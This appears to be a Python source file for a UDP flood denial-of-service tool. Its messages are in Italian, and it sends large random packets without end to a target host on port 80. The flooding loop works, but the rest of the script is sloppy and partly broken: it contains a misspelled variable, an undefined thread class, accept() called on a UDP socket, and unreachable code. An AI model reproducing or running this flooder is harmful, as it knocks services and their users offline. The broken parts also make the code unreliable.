import socket
import time
import random
import threading

IPADDRESS = ""
PORT = ""


class Denial:
    def __init__(self, host, port):
        threading.Thread.__init__(self)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.host = host
        self.port = 80
        self.duration = 0
        self.bytes = random._urandom(55600)
        self.send = 0

    def send_packet(self):
        while True:
            try:
                send_all = self.connection.sendto(self.bytes,(self.host, self.port))
                print("[+] Flood Startato su " + self.host)
            except UnboundLocalError:
                try:
                    pass
                    send_all = self.connection.sendto(self.bytes(self.host, self.port))
                except:
                    pass
            except KeyboardInterrupt:
                print("\n")
                print("[-]Uscita...")
                print("\n")
        while True:
            connect_all = sand_all.accept()
            newthread = ClientThread(send_all)
            newthread.start()

            print("Press Ctrl+C")
            more_dos = input("[+] stai cercando di floddare qualcuno offline[exit/return]: ")

            if more_dos == "exit":
                self.connection.close()
                exit()

            elif more_dos == "retur":
                self.send_packet()
            else:
                self.connection.close()
                exit()

results = Denial(IPADDRESS, PORT)
results.send_packet()
                    
